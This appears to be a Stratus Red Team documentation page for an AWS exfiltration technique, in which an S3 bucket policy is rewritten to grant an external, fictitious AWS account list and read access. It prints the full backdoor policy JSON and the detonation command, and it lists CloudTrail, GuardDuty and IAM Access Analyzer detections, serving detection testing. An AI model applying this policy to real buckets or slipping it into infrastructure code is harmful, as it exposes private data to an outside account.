---
title: Backdoor an S3 Bucket via its Bucket Policy
---

# Backdoor an S3 Bucket via its Bucket Policy


 <span class="smallcaps w3-badge w3-blue w3-round w3-text-white" title="This attack technique can be detonated multiple times">idempotent</span> 

Platform: AWS

## Mappings

- MITRE ATT&CK
    - Exfiltration



## Description


Exfiltrates data from an S3 bucket by backdooring its Bucket Policy to allow access from an external, fictitious AWS account.

<span style="font-variant: small-caps;">Warm-up</span>: 

- Create an S3 bucket.

<span style="font-variant: small-caps;">Detonation</span>: 

- Backdoor the S3 Bucket Policy by setting the following Bucket Policy:

<pre>
<code>
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::193672423079:root"
      },
      "Action": [
        "s3:GetObject",
        "s3:GetBucketLocation",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::%s/*",
        "arn:aws:s3:::%s"
      ]
    }
  ]
}
</code>
</pre>


## Instructions

```bash title="Detonate with Stratus Red Team"
stratus detonate aws.exfiltration.s3-backdoor-bucket-policy
```
## Detection


- Using CloudTrail's <code>PutBucketPolicy</code> event.

- Through GuardDuty's [Policy:S3/BucketAnonymousAccessGranted](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html#policy-s3-bucketanonymousaccessgranted) finding, 
if the S3 bucket was made public (and not only shared with an attacker-controlled AWS account).

- Through [IAM Access Analyzer](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-analyzer.html),
which generates a finding when an S3 bucket is made public or accessible from another account.


